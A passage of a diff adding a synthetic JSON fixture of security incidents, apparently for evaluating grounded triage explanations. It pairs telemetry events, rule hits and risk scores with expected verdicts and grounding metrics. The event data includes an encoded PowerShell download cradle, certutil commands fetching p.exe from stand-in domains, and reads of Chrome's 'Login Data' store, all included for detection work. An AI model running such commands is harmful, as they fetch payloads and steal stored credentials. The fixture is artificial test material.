+            "fact": "outbound connection to a7f3k2-cdn-update.top (203.0.113.19:443)"
+          }
+        ],
+        "rule_hits": [
+          "R005",
+          "R007"
+        ],
+        "ml_probability": 0.7434,
+        "risk_score": 63,
+        "risk_class": "High",
+        "signals": {
+          "deceptive_clipboard": [
+            "E000510"
+          ],
+          "unsigned_temp": [
+            "E000511"
+          ],
+          "rare_domain": [
+            "E000512"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0144",
+        "hypothesis": "social-engineering (ClickFix-style) leading to execution",
+        "confidence": "high",
+        "claims": [
+          {
+            "text": "Observed deceptive page followed by a clipboard command",
+            "evidence": [
+              "E000510"
+            ]
+          },
+          {
+            "text": "Observed contact with a rare/unusual destination",
+            "evidence": [
+              "E000512"
+            ]
+          },
+          {
+            "text": "Observed unsigned executable from a Temp path",
+            "evidence": [
+              "E000511"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000510",
+          "E000511",
+          "E000512"
+        ],
+        "contradicting_evidence": [],
+        "recommended_action": "quarantine",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 3,
+        "claims_grounded": 3,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0145",
+        "events": [
+          {
+            "id": "E000513",
+            "type": "browser_event",
+            "fact": "chrome navigate https://windows-update-check.xyz/update [page=fake_update]"
+          },
+          {
+            "id": "E000514",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\mocekknnjdaihknokgldlagbjoidfcbfg\\3.1.0_0\\manifest.json [appdata] signed=False"
+          },
+          {
+            "id": "E000515",
+            "type": "network_connect",
+            "fact": "outbound connection to windows-update-check.xyz (203.0.113.19:443)"
+          }
+        ],
+        "rule_hits": [
+          "R005",
+          "R007"
+        ],
+        "ml_probability": 0.7434,
+        "risk_score": 63,
+        "risk_class": "High",
+        "signals": {
+          "deceptive_clipboard": [
+            "E000513"
+          ],
+          "unsigned_temp": [
+            "E000514"
+          ],
+          "rare_domain": [
+            "E000515"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0145",
+        "hypothesis": "social-engineering (ClickFix-style) leading to execution",
+        "confidence": "high",
+        "claims": [
+          {
+            "text": "Observed deceptive page followed by a clipboard command",
+            "evidence": [
+              "E000513"
+            ]
+          },
+          {
+            "text": "Observed contact with a rare/unusual destination",
+            "evidence": [
+              "E000515"
+            ]
+          },
+          {
+            "text": "Observed unsigned executable from a Temp path",
+            "evidence": [
+              "E000514"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000513",
+          "E000514",
+          "E000515"
+        ],
+        "contradicting_evidence": [],
+        "recommended_action": "quarantine",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 3,
+        "claims_grounded": 3,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0146",
+        "events": [
+          {
+            "id": "E000516",
+            "type": "browser_event",
+            "fact": "chrome navigate https://session-refresh-portal.top/update [page=fake_update]"
+          },
+          {
+            "id": "E000517",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\maelmbenbmfgfcbjmijhbhomenlmengmk\\3.1.0_0\\manifest.json [appdata] signed=False"
+          },
+          {
+            "id": "E000518",
+            "type": "network_connect",
+            "fact": "outbound connection to session-refresh-portal.top (203.0.113.66:443)"
+          }
+        ],
+        "rule_hits": [
+          "R005",
+          "R007"
+        ],
+        "ml_probability": 0.7434,
+        "risk_score": 63,
+        "risk_class": "High",
+        "signals": {
+          "deceptive_clipboard": [
+            "E000516"
+          ],
+          "unsigned_temp": [
+            "E000517"
+          ],
+          "rare_domain": [
+            "E000518"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0146",
+        "hypothesis": "social-engineering (ClickFix-style) leading to execution",
+        "confidence": "high",
+        "claims": [
+          {
+            "text": "Observed deceptive page followed by a clipboard command",
+            "evidence": [
+              "E000516"
+            ]
+          },
+          {
+            "text": "Observed contact with a rare/unusual destination",
+            "evidence": [
+              "E000518"
+            ]
+          },
+          {
+            "text": "Observed unsigned executable from a Temp path",
+            "evidence": [
+              "E000517"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000516",
+          "E000517",
+          "E000518"
+        ],
+        "contradicting_evidence": [],
+        "recommended_action": "quarantine",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 3,
+        "claims_grounded": 3,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0147",
+        "events": [
+          {
+            "id": "E000519",
+            "type": "browser_event",
+            "fact": "chrome navigate https://windows-update-check.xyz/update [page=fake_update]"
+          },
+          {
+            "id": "E000520",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\mioggdnkcocihlmgakhnnmamgaeboofao\\3.1.0_0\\manifest.json [appdata] signed=False"
+          },
+          {
+            "id": "E000521",
+            "type": "network_connect",
+            "fact": "outbound connection to windows-update-check.xyz (203.0.113.66:443)"
+          }
+        ],
+        "rule_hits": [
+          "R005",
+          "R007"
+        ],
+        "ml_probability": 0.7434,
+        "risk_score": 63,
+        "risk_class": "High",
+        "signals": {
+          "deceptive_clipboard": [
+            "E000519"
+          ],
+          "unsigned_temp": [
+            "E000520"
+          ],
+          "rare_domain": [
+            "E000521"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0147",
+        "hypothesis": "social-engineering (ClickFix-style) leading to execution",
+        "confidence": "high",
+        "claims": [
+          {
+            "text": "Observed deceptive page followed by a clipboard command",
+            "evidence": [
+              "E000519"
+            ]
+          },
+          {
+            "text": "Observed contact with a rare/unusual destination",
+            "evidence": [
+              "E000521"
+            ]
+          },
+          {
+            "text": "Observed unsigned executable from a Temp path",
+            "evidence": [
+              "E000520"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000519",
+          "E000520",
+          "E000521"
+        ],
+        "contradicting_evidence": [],
+        "recommended_action": "quarantine",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 3,
+        "claims_grounded": 3,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0148",
+        "events": [
+          {
+            "id": "E000522",
+            "type": "browser_event",
+            "fact": "chrome navigate https://a7f3k2-cdn-update.top/update [page=fake_update]"
+          },
+          {
+            "id": "E000523",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\mlpoldflojgfbhkhegkkkamkmphgpehih\\3.1.0_0\\manifest.json [appdata] signed=False"
+          },
+          {
+            "id": "E000524",
+            "type": "network_connect",
+            "fact": "outbound connection to a7f3k2-cdn-update.top (203.0.113.66:443)"
+          }
+        ],
+        "rule_hits": [
+          "R005",
+          "R007"
+        ],
+        "ml_probability": 0.7434,
+        "risk_score": 63,
+        "risk_class": "High",
+        "signals": {
+          "deceptive_clipboard": [
+            "E000522"
+          ],
+          "unsigned_temp": [
+            "E000523"
+          ],
+          "rare_domain": [
+            "E000524"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0148",
+        "hypothesis": "social-engineering (ClickFix-style) leading to execution",
+        "confidence": "high",
+        "claims": [
+          {
+            "text": "Observed deceptive page followed by a clipboard command",
+            "evidence": [
+              "E000522"
+            ]
+          },
+          {
+            "text": "Observed contact with a rare/unusual destination",
+            "evidence": [
+              "E000524"
+            ]
+          },
+          {
+            "text": "Observed unsigned executable from a Temp path",
+            "evidence": [
+              "E000523"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000522",
+          "E000523",
+          "E000524"
+        ],
+        "contradicting_evidence": [],
+        "recommended_action": "quarantine",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 3,
+        "claims_grounded": 3,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0149",
+        "events": [
+          {
+            "id": "E000525",
+            "type": "process_create",
+            "fact": "process powershell.exe (Microsoft Corporation) launched: powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
+          },
+          {
+            "id": "E000526",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\AppData\\Local\\enc8655.exe [appdata] signed=False"
+          },
+          {
+            "id": "E000527",
+            "type": "file_access",
+            "fact": "sensitive file access: C:\\Users\\synthetic_user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+          },
+          {
+            "id": "E000528",
+            "type": "network_connect",
+            "fact": "outbound connection to verify-account-secure.click (203.0.113.66:443)"
+          }
+        ],
+        "rule_hits": [
+          "R005",
+          "R006",
+          "R007",
+          "R011"
+        ],
+        "ml_probability": 0.9967,
+        "risk_score": 100,
+        "risk_class": "Critical",
+        "signals": {
+          "encoded_command": [
+            "E000525"
+          ],
+          "unsigned_temp": [
+            "E000526"
+          ],
+          "browser_store_access": [
+            "E000527"
+          ],
+          "rare_domain": [
+            "E000528"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0149",
+        "hypothesis": "credential/session theft with exfiltration",
+        "confidence": "high",
+        "claims": [
+          {
+            "text": "Observed browser credential-store access by an unknown process",
+            "evidence": [
+              "E000527"
+            ]
+          },
+          {
+            "text": "Observed encoded PowerShell command",
+            "evidence": [
+              "E000525"
+            ]
+          },
+          {
+            "text": "Observed contact with a rare/unusual destination",
+            "evidence": [
+              "E000528"
+            ]
+          },
+          {
+            "text": "Observed unsigned executable from a Temp path",
+            "evidence": [
+              "E000526"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000525",
+          "E000526",
+          "E000527",
+          "E000528"
+        ],
+        "contradicting_evidence": [],
+        "recommended_action": "quarantine",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 4,
+        "claims_grounded": 4,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0150",
+        "events": [
+          {
+            "id": "E000529",
+            "type": "process_create",
+            "fact": "process powershell.exe (Microsoft Corporation) launched: powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
+          },
+          {
+            "id": "E000530",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\AppData\\Local\\enc6771.exe [appdata] signed=False"
+          },
+          {
+            "id": "E000531",
+            "type": "file_access",
+            "fact": "sensitive file access: C:\\Users\\synthetic_user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+          },
+          {
+            "id": "E000532",
+            "type": "network_connect",
+            "fact": "outbound connection to cdn-delivery-node.top (198.51.100.200:443)"
+          }
+        ],
+        "rule_hits": [
+          "R005",
+          "R006",
+          "R007",
+          "R011"
+        ],
+        "ml_probability": 0.9967,
+        "risk_score": 100,
+        "risk_class": "Critical",
+        "signals": {
+          "encoded_command": [
+            "E000529"
+          ],
+          "unsigned_temp": [
+            "E000530"
+          ],
+          "browser_store_access": [
+            "E000531"
+          ],
+          "rare_domain": [
+            "E000532"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0150",
+        "hypothesis": "credential/session theft with exfiltration",
+        "confidence": "high",
+        "claims": [
+          {
+            "text": "Observed browser credential-store access by an unknown process",
+            "evidence": [
+              "E000531"
+            ]
+          },
+          {
+            "text": "Observed encoded PowerShell command",
+            "evidence": [
+              "E000529"
+            ]
+          },
+          {
+            "text": "Observed contact with a rare/unusual destination",
+            "evidence": [
+              "E000532"
+            ]
+          },
+          {
+            "text": "Observed unsigned executable from a Temp path",
+            "evidence": [
+              "E000530"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000529",
+          "E000530",
+          "E000531",
+          "E000532"
+        ],
+        "contradicting_evidence": [],
+        "recommended_action": "quarantine",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 4,
+        "claims_grounded": 4,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0151",
+        "events": [
+          {
+            "id": "E000533",
+            "type": "process_create",
+            "fact": "process powershell.exe (Microsoft Corporation) launched: powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
+          },
+          {
+            "id": "E000534",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\AppData\\Local\\enc4780.exe [appdata] signed=False"
+          },
+          {
+            "id": "E000535",
+            "type": "file_access",
+            "fact": "sensitive file access: C:\\Users\\synthetic_user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+          },
+          {
+            "id": "E000536",
+            "type": "network_connect",
+            "fact": "outbound connection to cloudflare-verify.support (198.51.100.200:443)"
+          }
+        ],
+        "rule_hits": [
+          "R005",
+          "R006",
+          "R007",
+          "R011"
+        ],
+        "ml_probability": 0.9967,
+        "risk_score": 100,
+        "risk_class": "Critical",
+        "signals": {
+          "encoded_command": [
+            "E000533"
+          ],
+          "unsigned_temp": [
+            "E000534"
+          ],
+          "browser_store_access": [
+            "E000535"
+          ],
+          "rare_domain": [
+            "E000536"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0151",
+        "hypothesis": "credential/session theft with exfiltration",
+        "confidence": "high",
+        "claims": [
+          {
+            "text": "Observed browser credential-store access by an unknown process",
+            "evidence": [
+              "E000535"
+            ]
+          },
+          {
+            "text": "Observed encoded PowerShell command",
+            "evidence": [
+              "E000533"
+            ]
+          },
+          {
+            "text": "Observed contact with a rare/unusual destination",
+            "evidence": [
+              "E000536"
+            ]
+          },
+          {
+            "text": "Observed unsigned executable from a Temp path",
+            "evidence": [
+              "E000534"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000533",
+          "E000534",
+          "E000535",
+          "E000536"
+        ],
+        "contradicting_evidence": [],
+        "recommended_action": "quarantine",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 4,
+        "claims_grounded": 4,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0152",
+        "events": [
+          {
+            "id": "E000537",
+            "type": "process_create",
+            "fact": "process powershell.exe (Microsoft Corporation) launched: powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
+          },
+          {
+            "id": "E000538",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\AppData\\Local\\enc4324.exe [appdata] signed=False"
+          },
+          {
+            "id": "E000539",
+            "type": "file_access",
+            "fact": "sensitive file access: C:\\Users\\synthetic_user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+          },
+          {
+            "id": "E000540",
+            "type": "network_connect",
+            "fact": "outbound connection to cloudflare-verify.support (203.0.113.66:443)"
+          }
+        ],
+        "rule_hits": [
+          "R005",
+          "R006",
+          "R007",
+          "R011"
+        ],
+        "ml_probability": 0.9967,
+        "risk_score": 100,
+        "risk_class": "Critical",
+        "signals": {
+          "encoded_command": [
+            "E000537"
+          ],
+          "unsigned_temp": [
+            "E000538"
+          ],
+          "browser_store_access": [
+            "E000539"
+          ],
+          "rare_domain": [
+            "E000540"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0152",
+        "hypothesis": "credential/session theft with exfiltration",
+        "confidence": "high",
+        "claims": [
+          {
+            "text": "Observed browser credential-store access by an unknown process",
+            "evidence": [
+              "E000539"
+            ]
+          },
+          {
+            "text": "Observed encoded PowerShell command",
+            "evidence": [
+              "E000537"
+            ]
+          },
+          {
+            "text": "Observed contact with a rare/unusual destination",
+            "evidence": [
+              "E000540"
+            ]
+          },
+          {
+            "text": "Observed unsigned executable from a Temp path",
+            "evidence": [
+              "E000538"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000537",
+          "E000538",
+          "E000539",
+          "E000540"
+        ],
+        "contradicting_evidence": [],
+        "recommended_action": "quarantine",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 4,
+        "claims_grounded": 4,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0153",
+        "events": [
+          {
+            "id": "E000541",
+            "type": "process_create",
+            "fact": "process powershell.exe (Microsoft Corporation) launched: powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
+          },
+          {
+            "id": "E000542",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\AppData\\Local\\enc3118.exe [appdata] signed=False"
+          },
+          {
+            "id": "E000543",
+            "type": "file_access",
+            "fact": "sensitive file access: C:\\Users\\synthetic_user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+          },
+          {
+            "id": "E000544",
+            "type": "network_connect",
+            "fact": "outbound connection to session-refresh-portal.top (203.0.113.19:443)"
+          }
+        ],
+        "rule_hits": [
+          "R005",
+          "R006",
+          "R007",
+          "R011"
+        ],
+        "ml_probability": 0.9967,
+        "risk_score": 100,
+        "risk_class": "Critical",
+        "signals": {
+          "encoded_command": [
+            "E000541"
+          ],
+          "unsigned_temp": [
+            "E000542"
+          ],
+          "browser_store_access": [
+            "E000543"
+          ],
+          "rare_domain": [
+            "E000544"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0153",
+        "hypothesis": "credential/session theft with exfiltration",
+        "confidence": "high",
+        "claims": [
+          {
+            "text": "Observed browser credential-store access by an unknown process",
+            "evidence": [
+              "E000543"
+            ]
+          },
+          {
+            "text": "Observed encoded PowerShell command",
+            "evidence": [
+              "E000541"
+            ]
+          },
+          {
+            "text": "Observed contact with a rare/unusual destination",
+            "evidence": [
+              "E000544"
+            ]
+          },
+          {
+            "text": "Observed unsigned executable from a Temp path",
+            "evidence": [
+              "E000542"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000541",
+          "E000542",
+          "E000543",
+          "E000544"
+        ],
+        "contradicting_evidence": [],
+        "recommended_action": "quarantine",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 4,
+        "claims_grounded": 4,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0154",
+        "events": [
+          {
+            "id": "E000545",
+            "type": "process_create",
+            "fact": "process powershell.exe (Microsoft Corporation) launched: powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
+          },
+          {
+            "id": "E000546",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\AppData\\Local\\enc8230.exe [appdata] signed=False"
+          },
+          {
+            "id": "E000547",
+            "type": "file_access",
+            "fact": "sensitive file access: C:\\Users\\synthetic_user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+          },
+          {
+            "id": "E000548",
+            "type": "network_connect",
+            "fact": "outbound connection to verify-account-secure.click (203.0.113.66:443)"
+          }
+        ],
+        "rule_hits": [
+          "R005",
+          "R006",
+          "R007",
+          "R011"
+        ],
+        "ml_probability": 0.9967,
+        "risk_score": 100,
+        "risk_class": "Critical",
+        "signals": {
+          "encoded_command": [
+            "E000545"
+          ],
+          "unsigned_temp": [
+            "E000546"
+          ],
+          "browser_store_access": [
+            "E000547"
+          ],
+          "rare_domain": [
+            "E000548"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0154",
+        "hypothesis": "credential/session theft with exfiltration",
+        "confidence": "high",
+        "claims": [
+          {
+            "text": "Observed browser credential-store access by an unknown process",
+            "evidence": [
+              "E000547"
+            ]
+          },
+          {
+            "text": "Observed encoded PowerShell command",
+            "evidence": [
+              "E000545"
+            ]
+          },
+          {
+            "text": "Observed contact with a rare/unusual destination",
+            "evidence": [
+              "E000548"
+            ]
+          },
+          {
+            "text": "Observed unsigned executable from a Temp path",
+            "evidence": [
+              "E000546"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000545",
+          "E000546",
+          "E000547",
+          "E000548"
+        ],
+        "contradicting_evidence": [],
+        "recommended_action": "quarantine",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 4,
+        "claims_grounded": 4,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0155",
+        "events": [
+          {
+            "id": "E000549",
+            "type": "process_create",
+            "fact": "process powershell.exe (Microsoft Corporation) launched: powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
+          },
+          {
+            "id": "E000550",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\AppData\\Local\\enc8356.exe [appdata] signed=False"
+          },
+          {
+            "id": "E000551",
+            "type": "file_access",
+            "fact": "sensitive file access: C:\\Users\\synthetic_user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+          },
+          {
+            "id": "E000552",
+            "type": "network_connect",
+            "fact": "outbound connection to cdn-delivery-node.top (203.0.113.66:443)"
+          }
+        ],
+        "rule_hits": [
+          "R005",
+          "R006",
+          "R007",
+          "R011"
+        ],
+        "ml_probability": 0.9967,
+        "risk_score": 100,
+        "risk_class": "Critical",
+        "signals": {
+          "encoded_command": [
+            "E000549"
+          ],
+          "unsigned_temp": [
+            "E000550"
+          ],
+          "browser_store_access": [
+            "E000551"
+          ],
+          "rare_domain": [
+            "E000552"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0155",
+        "hypothesis": "credential/session theft with exfiltration",
+        "confidence": "high",
+        "claims": [
+          {
+            "text": "Observed browser credential-store access by an unknown process",
+            "evidence": [
+              "E000551"
+            ]
+          },
+          {
+            "text": "Observed encoded PowerShell command",
+            "evidence": [
+              "E000549"
+            ]
+          },
+          {
+            "text": "Observed contact with a rare/unusual destination",
+            "evidence": [
+              "E000552"
+            ]
+          },
+          {
+            "text": "Observed unsigned executable from a Temp path",
+            "evidence": [
+              "E000550"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000549",
+          "E000550",
+          "E000551",
+          "E000552"
+        ],
+        "contradicting_evidence": [],
+        "recommended_action": "quarantine",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 4,
+        "claims_grounded": 4,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0156",
+        "events": [
+          {
+            "id": "E000553",
+            "type": "process_create",
+            "fact": "process certutil.exe (Microsoft Corporation) launched: certutil.exe -urlcache -split -f https://cloudflare-verify.support/p.exe payload.bin"
+          },
+          {
+            "id": "E000554",
+            "type": "network_connect",
+            "fact": "outbound connection to cloudflare-verify.support (198.51.100.200:443)"
+          }
+        ],
+        "rule_hits": [
+          "R003",
+          "R007",
+          "R009"
+        ],
+        "ml_probability": 0.7741,
+        "risk_score": 75,
+        "risk_class": "High",
+        "signals": {
+          "remote_download": [
+            "E000553"
+          ],
+          "lolbin": [
+            "E000553"
+          ],
+          "rare_domain": [
+            "E000554"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0156",
+        "hypothesis": "suspicious unsigned or LOLBin artifact",
+        "confidence": "high",
+        "claims": [
+          {
+            "text": "Observed LOLBin abuse",
+            "evidence": [
+              "E000553"
+            ]
+          },
+          {
+            "text": "Observed contact with a rare/unusual destination",
+            "evidence": [
+              "E000554"
+            ]
+          },
+          {
+            "text": "Observed remote script/payload download",
+            "evidence": [
+              "E000553"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000553",
+          "E000554"
+        ],
+        "contradicting_evidence": [],
+        "recommended_action": "quarantine",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 3,
+        "claims_grounded": 3,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0157",
+        "events": [
+          {
+            "id": "E000555",
+            "type": "process_create",
+            "fact": "process certutil.exe (Microsoft Corporation) launched: certutil.exe -urlcache -split -f https://windows-update-check.xyz/p.exe payload.bin"
+          },
+          {
+            "id": "E000556",
+            "type": "network_connect",
+            "fact": "outbound connection to windows-update-check.xyz (203.0.113.66:443)"
+          }
+        ],
+        "rule_hits": [
+          "R003",
+          "R007",
+          "R009"
+        ],
+        "ml_probability": 0.7741,
+        "risk_score": 75,
+        "risk_class": "High",
+        "signals": {
+          "remote_download": [
+            "E000555"
+          ],
+          "lolbin": [
+            "E000555"
+          ],
+          "rare_domain": [
+            "E000556"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0157",
+        "hypothesis": "suspicious unsigned or LOLBin artifact",
+        "confidence": "high",
+        "claims": [
+          {
+            "text": "Observed LOLBin abuse",
+            "evidence": [
+              "E000555"
+            ]
+          },
+          {
+            "text": "Observed contact with a rare/unusual destination",
+            "evidence": [
+              "E000556"
+            ]
+          },
+          {
+            "text": "Observed remote script/payload download",
+            "evidence": [
+              "E000555"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000555",
+          "E000556"
+        ],
+        "contradicting_evidence": [],
+        "recommended_action": "quarantine",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 3,
+        "claims_grounded": 3,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0158",
+        "events": [
+          {
+            "id": "E000557",
+            "type": "process_create",
+            "fact": "process certutil.exe (Microsoft Corporation) launched: certutil.exe -urlcache -split -f https://session-refresh-portal.top/p.exe payload.bin"
+          },
+          {
+            "id": "E000558",
+            "type": "network_connect",
+            "fact": "outbound connection to session-refresh-portal.top (203.0.113.66:443)"
+          }
+        ],
+        "rule_hits": [
+          "R003",
+          "R007",
+          "R009"
+        ],
+        "ml_probability": 0.7741,
+        "risk_score": 75,
+        "risk_class": "High",
+        "signals": {
+          "remote_download": [
+            "E000557"
+          ],
+          "lolbin": [
+            "E000557"
+          ],
+          "rare_domain": [
+            "E000558"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0158",
+        "hypothesis": "suspicious unsigned or LOLBin artifact",
+        "confidence": "high",
+        "claims": [
+          {
+            "text": "Observed LOLBin abuse",
+            "evidence": [
+              "E000557"
+            ]
+          },
+          {
+            "text": "Observed contact with a rare/unusual destination",
+            "evidence": [
+              "E000558"
+            ]
+          },
+          {
+            "text": "Observed remote script/payload download",
+            "evidence": [
+              "E000557"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000557",
+          "E000558"
+        ],
+        "contradicting_evidence": [],
+        "recommended_action": "quarantine",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
